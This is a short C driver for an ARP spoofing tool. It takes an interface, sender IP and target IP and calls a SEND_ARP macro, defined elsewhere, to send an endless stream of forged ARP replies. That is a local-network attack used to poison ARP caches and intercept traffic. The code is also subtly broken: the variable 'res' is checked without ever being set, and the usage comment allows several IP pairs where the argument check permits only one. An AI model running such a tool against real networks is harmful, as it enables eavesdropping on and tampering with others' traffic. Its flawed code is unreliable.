/* Copyright © 2018 James Sung. All rights reserved. */

#include "functions.h"

// arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		PRINT_USAGE();
		puts("[*] Exiting program with -1");
		return -1;
	}
	
	puts("[+] Running program...\n");

	int res;

	// default set to send infinite number of fake replies (infinite if count < 0, otherwise send <count> packets)
	SEND_ARP(argv[1], argv[2], argv[3], -1);

	if (res == -1)
	{
		return -1;
	}

	puts("[*] Exiting program with 0");

	return 0;
}

